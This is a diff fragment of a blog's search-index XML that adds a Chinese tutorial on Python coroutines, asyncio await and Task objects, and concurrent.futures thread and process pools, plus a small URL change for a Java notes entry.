+<li>定义函数的时候<code>async def 函数名</code></li>
+</ul>
+</li>
+<li><p>协程对象</p>
+<ul>
+<li>执行协程函数()得到的就是协程对象</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">func</span>()</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line">result = func()</span><br></pre></td></tr></table></figure>
+
+<p><strong>执行协程函数创建协程对象，函数内部不会执行代码</strong></p>
+<p>如果想要运行协程函数内部代码，必须要把协程对象交给事件循环来处理。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">func</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">q = func()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Python &gt; 3.7</span></span><br><span class="line">asyncio.run(q)</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="await关键字"><a href="#await关键字" class="headerlink" title="await关键字"></a>await关键字</h2><p>await+可等待对象（协程对象、Future、Task对象）</p>
+<p>  await就是等待对象的值得到结果之后在继续向下走</p>
+<p>示例1：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">func1</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    response = <span class="keyword">await</span> asyncio.sleep(<span class="number">2</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">asyncio.run( func1() )</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>示例2：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">others</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;start&quot;</span>)</span><br><span class="line">    <span class="keyword">await</span> asyncio.sleep(<span class="number">2</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;end&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;返回值&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">func</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;执行协程函数内部代码&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    response = <span class="keyword">await</span> others()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;IO请求结束，结果为：&#x27;</span>, response)</span><br><span class="line"></span><br><span class="line">asyncio.run( func() )</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="Task对象"><a href="#Task对象" class="headerlink" title="Task对象"></a>Task对象</h2><p>在事件循环中添加多个任务</p>
+<p>Task对象用于并发的调度协程，通过<code>asyncio.create_task(协程对象)</code>的方式创建Task对象，这样可以让协程加入事件循环当中等待被调度执行。除了使用<code>asyncio.create_task()</code>函数以外，还可以用低层的<code>loop.create_task()</code>或<code>ensure_future()</code>函数。<strong>不建议手动实例化task对象。</strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">others</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;start&quot;</span>)</span><br><span class="line">    <span class="keyword">await</span> asyncio.sleep(<span class="number">2</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;end&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;返回值&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;main开始&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将任务添加到事件循环</span></span><br><span class="line">    task_list = [</span><br><span class="line">        asyncio.Task(others(), name=<span class="string">&#x27;n1&#x27;</span>),</span><br><span class="line">        asyncio.Task(others(), name=<span class="string">&quot;n2&quot;</span>)</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;main结束&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># done是一个集合</span></span><br><span class="line">    done,pending = <span class="keyword">await</span> asyncio.wait(task_list, timeout=<span class="literal">None</span>)</span><br><span class="line">    <span class="built_in">print</span>(done)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建事件循环</span></span><br><span class="line">asyncio.run(main())</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="concurrent-futures-Future-对象"><a href="#concurrent-futures-Future-对象" class="headerlink" title="concurrent.futures.Future()对象"></a>concurrent.futures.Future()对象</h2><p>使用线程池、进程池实现异步操作时用到的对象。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> Future</span><br><span class="line"><span class="keyword">from</span> concurrent.futures.thread <span class="keyword">import</span> ThreadPoolExecutor</span><br><span class="line"><span class="keyword">from</span> concurrent.futures.process <span class="keyword">import</span> ProcessPoolExecutor</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>(<span class="params">value</span>):</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(value)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">123</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个线程池</span></span><br><span class="line">pool = ThreadPoolExecutor(max_workers=<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建进程池</span></span><br><span class="line">pool1 = ProcessPoolExecutor(max_workers=<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    fut = pool.submit(func, i)</span><br><span class="line">    <span class="built_in">print</span>(fut)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>以后可能存在交叉使用。</p>
+<p>多个方法的时候，就回调函数</p>
+<p>基于多线程实现的异步</p>
+<p>CPU密集型用多进程，IO密集型用异步</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a><center>总结</center></h1><ul>
+<li><p>信号量，多进程，进程池的区别  </p>
+<p>  <strong>信号量</strong>：如果有500件衣服要做，于是招了500个人，只有4台机器，谁完成任务了再进几个人，也就是4个信号量，500个进程，机器是cpu，4个cpu，每个人是每个进程，每件衣服是一个任务  </p>
+<p>  <strong>多进程</strong>：500个人抢四台机器，每个人只能工作十分钟，相对于时间片，不管做没有做完，就走了，就是500个进程做500个任务  </p>
+<p>  <strong>进程池</strong>：4个人做500件衣服，4台机器，谁来谁就可以做衣服。而对于多进程来说，操作系统来调度500个人谁用机器，谁不用机器，和调度4个人是不一样的。所以不能有几件衣服就雇几个人，而是都几台机器就雇几个人。这样人都转起来了，并且都能完成任务。而且工厂负担也小一点，这就是池的概念。</p>
+</li>
+</ul>
+<p>CPU密集用多进程，IO密集用异步协程</p>
+]]></content>
+      <categories>
+        <category>工具</category>
+      </categories>
+      <tags>
+        <tag>Python</tag>
       </tags>
   </entry>
   <entry>
@@ -492,7 +690,7 @@
   </entry>
   <entry>
     <title>JAVA知识点整理</title>
-    <url>/JAVA/JAVA/</url>
+    <url>/%E7%9F%A5%E8%AF%86%E6%A0%91/JAVA/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>语言学习笔记</p>
 <span id="more"></span>
 
